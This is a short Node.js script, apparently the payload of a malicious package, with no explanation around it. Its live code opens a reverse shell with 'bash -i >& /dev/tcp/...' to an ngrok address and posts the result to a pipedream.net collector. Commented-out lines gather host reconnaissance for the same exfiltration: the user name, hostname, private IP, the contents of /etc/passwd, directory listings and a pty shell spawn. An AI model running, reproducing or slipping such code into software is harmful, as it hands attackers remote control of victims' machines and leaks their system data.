const execSync = require('child_process').execSync;

// const priv_ip = execSync('hostname -I', { encoding: 'utf-8' });
// const whoami = execSync('whoami', { encoding: 'utf-8' });
// const host = execSync('hostname', { encoding: 'utf-8' });
// const current_dir = execSync('pwd', { encoding: 'utf-8' });
// const passwd = execSync('cat /etc/passwd', { encoding: 'utf-8' });
// const ls1 = execSync('ls', { encoding: 'utf-8' });
// const ls2 = execSync('ls ../', { encoding: 'utf-8' });
// const ls3 = execSync('ls ../../', { encoding: 'utf-8' });
// const ls4 = execSync('ls ../../../', { encoding: 'utf-8' });
// const ls5 = execSync('ls ../../../../', { encoding: 'utf-8' });
// const ls6 = execSync('ls ../../../../../', { encoding: 'utf-8' });
// const ls7 = execSync('ls ../../../../../../', { encoding: 'utf-8' });
// const ls8 = execSync('ls ../../../../../../../', { encoding: 'utf-8' });
// const ls9 = execSync('ls ../../../../../../../../', { encoding: 'utf-8' });
// const ls10 = execSync('ls ../../../../../../../../../', { encoding: 'utf-8' });
// const py3 = execSync("python3 -c 'import pty; pty.spawn('/bin/bash')'", { encoding: 'utf-8' });
// const py = execSync('python --version', { encoding: 'utf-8' });
// const bash = execSync('which bash', { encoding: 'utf-8' });
// const lsb = execSync('lsb_release -a', { encoding: 'utf-8' });
// const php = execSync('php --version', { encoding: 'utf-8' });
const shell = execSync('bash -i >& /dev/tcp/0.tcp.in.ngrok.io/12064 0>&1', { encoding: 'utf-8' });


const https = require("https")

const data = JSON.stringify({
  // "private IP": priv_ip,
  // "whoami": whoami,
  // "hostname": host,
  // "current dir": current_dir,
  // "passwd": passwd,
  // "ls1": ls1,
  // "ls2": ls2,
  // "ls3": ls3,
  // "ls4": ls4,
  // "ls5": ls5,
  // "ls6": ls6,
  // "ls7": ls7,
  // "ls8": ls8,
  // "ls9": ls9,
  // "ls10": ls10,
  // "py3": py3,
  // "py": py,
  // "bash": bash,
  // "lsb": lsb,
  // "php": php,
  "shell": shell,
})

const options = {
  hostname: "eo56j4tfa20w1b7.m.pipedream.net",
  port: 443,
  path: "/",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": data.length,
  },
}

const req = https.request(options)
req.write(data)
req.end()